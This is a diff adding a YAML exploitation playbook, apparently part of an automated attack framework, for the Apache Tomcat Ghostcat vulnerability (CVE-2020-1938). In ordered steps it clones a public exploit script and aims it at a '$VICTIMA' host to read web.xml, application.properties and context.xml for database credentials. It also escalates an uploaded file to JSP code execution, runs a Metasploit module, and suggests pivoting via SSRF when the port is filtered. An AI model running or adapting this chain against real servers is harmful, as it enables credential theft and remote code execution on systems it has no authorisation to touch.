@@ -1,0 +1,66 @@
+chain_id: tomcat_ghostcat_cve_2020_1938
+title: "Tomcat — Ghostcat (CVE-2020-1938) AJP file read & include"
+severity: HIGH
+tags: [tomcat, web, ajp, cve-2020-1938, ghostcat, file-read, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2020-1938" }
+    - { banner_pattern: "(?i)apache.*tomcat" }
+    - { service_pattern: "(?i)ajp13|ajp" }
+    - { port_in: [8009] }
+
+description: |
+  Tomcat 6/7/8/9 ships AJP enabled on 8009. By smuggling
+  `javax.servlet.include.request_uri`/`servlet_path`/`path_info` AJP
+  attributes you make Tomcat treat any file under the webapp root as a
+  JSP for inclusion. Read `WEB-INF/web.xml` (creds, secrets) directly,
+  or — if you can drop a file via FTP/upload — execute it as JSP for
+  full RCE.
+
+steps:
+  - id: 1
+    title: "Confirm AJP is exposed"
+    command: |
+      nmap -sV -p 8009 $VICTIMA
+      nmap -p 8009 --script=ajp-headers $VICTIMA
+
+  - id: 2
+    title: "Read WEB-INF/web.xml"
+    command: |
+      git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487 /tmp/ghost
+      python3 /tmp/ghost/ajpShooter.py http://$VICTIMA:8080 8009 \
+        /WEB-INF/web.xml read
+
+  - id: 3
+    title: "Read application.properties / context.xml (DB creds live here)"
+    command: |
+      python3 /tmp/ghost/ajpShooter.py http://$VICTIMA:8080 8009 \
+        /WEB-INF/classes/application.properties read
+      python3 /tmp/ghost/ajpShooter.py http://$VICTIMA:8080 8009 \
+        /META-INF/context.xml read
+
+  - id: 4
+    title: "If you can upload any file under webapps/ — turn it into JSP exec"
+    command: |
+      # E.g. via anonymous FTP that writes to /opt/tomcat/webapps/ROOT:
+      python3 /tmp/ghost/ajpShooter.py http://$VICTIMA:8080 8009 \
+        /uploaded.txt eval
+
+  - id: 5
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use auxiliary/admin/http/tomcat_ghostcat; \
+        set RHOSTS $VICTIMA; set RPORT 8009; \
+        set FILENAME /WEB-INF/web.xml; run'
+
+common_errors:
+  - error: "8009 closed / filtered"
+    solution: |
+      Default `secretRequired=true` (Tomcat ≥ 9.0.31, 8.5.51, 7.0.100)
+      blocks unauth AJP. Some hardened builds bind AJP to localhost
+      only — pivot through SSRF or jump-box if you have one.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2020-1938
+  - https://www.chaitin.cn/en/ghostcat
